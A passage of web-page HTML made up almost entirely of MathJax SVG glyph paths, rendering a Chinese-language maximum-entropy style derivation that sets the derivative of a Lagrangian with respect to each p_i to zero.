65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(20843.7,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"28\" d=\"M758 -1237T758 -1240T752 -1249H736Q718 -1249 717 -1248Q711 -1245 672 -1199Q237 -706 237 251T672 1700Q697 1730 716 1749Q718 1750 735 1750H752Q758 1744 758 1741Q758 1737 740 1713T689 1644T619 1537T540 1380T463 1176Q348 802 348 251Q348 -242 441 -599T744 -1218Q758 -1237 758 -1240Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(792,0)\"><path data-c=\"1D707\" d=\"M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1617.2,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(2617.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(4228.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(5058.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(5854,0) translate(0 -0.5)\"><path data-c=\"29\" d=\"M33 1741Q33 1750 51 1750H60H65Q73 1750 81 1743T119 1700Q554 1207 554 251Q554 -707 119 -1199Q76 -1250 66 -1250Q65 -1250 62 -1250T56 -1249Q55 -1249 53 -1249T49 -1250Q33 -1250 33 -1239Q33 -1236 50 -1214T98 -1150T163 -1052T238 -910T311 -727Q443 -335 443 251Q443 402 436 532T405 831T339 1142T224 1438T50 1716Q33 1737 33 1741Z\"/></g></g></g></g></svg></mjx-container></span> 对每一个 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.878ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 830 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span> 求导： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.991ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"74.239ex\" height=\"5.138ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 32813.5 2271\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(290,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><rect width=\"1596\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(2113.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3169.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4114.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(5392.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(5558.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6611,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(7611.2,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8333.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(9333.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(10138.9,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(11139.1,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(11705.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(12778.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(13834.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(14612.4,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(15890.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(17168.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(17334.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(18442.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(19498.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(20276.4,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(20998.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(21998.8,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(22804,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(23804.3,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(24370.3,0)\"><g 